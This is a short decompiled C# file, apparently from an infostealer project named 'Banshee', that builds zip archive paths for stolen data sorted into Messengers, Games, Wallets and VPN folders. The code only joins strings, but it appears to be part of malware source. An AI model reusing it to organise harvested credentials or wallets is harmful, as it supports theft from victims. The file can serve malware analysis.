﻿using System;

namespace Banshee.Helper.Data
{
	// Token: 0x020000FF RID: 255
	public static class ZipPath
	{
		// Token: 0x0600036A RID: 874 RVA: 0x0001B99C File Offset: 0x0001B99C
		private static string Combine(string category, string relativePath)
		{
			if (string.IsNullOrWhiteSpace(category))
			{
				throw new ArgumentException("category");
			}
			string text = category.Trim(new char[]
			{
				'\\',
				'/'
			});
			string text2 = (relativePath ?? string.Empty).Trim(new char[]
			{
				'\\',
				'/'
			});
			if (string.IsNullOrEmpty(text2))
			{
				return text;
			}
			string text3 = text2.Replace('\\', '/');
			string result = text3;
			if (!text3.StartsWith(text + "/", StringComparison.OrdinalIgnoreCase) && !text3.Equals(text, StringComparison.OrdinalIgnoreCase))
			{
				result = text + "/" + text3;
			}
			return result;
		}

		// Token: 0x0600036B RID: 875 RVA: 0x0001BA36 File Offset: 0x0001BA36
		public static string Messengers(string relativePath)
		{
			return ZipPath.Combine("Messengers", relativePath);
		}

		// Token: 0x0600036C RID: 876 RVA: 0x0001BA43 File Offset: 0x0001BA43
		public static string Games(string relativePath)
		{
			return ZipPath.Combine("Games", relativePath);
		}

		// Token: 0x0600036D RID: 877 RVA: 0x0001BA50 File Offset: 0x0001BA50
		public static string Wallets(string relativePath)
		{
			return ZipPath.Combine("Wallets", relativePath);
		}

		// Token: 0x0600036E RID: 878 RVA: 0x0001BA5D File Offset: 0x0001BA5D
		public static string Vpn(string relativePath)
		{
			return ZipPath.Combine("VPN", relativePath);
		}
	}
}
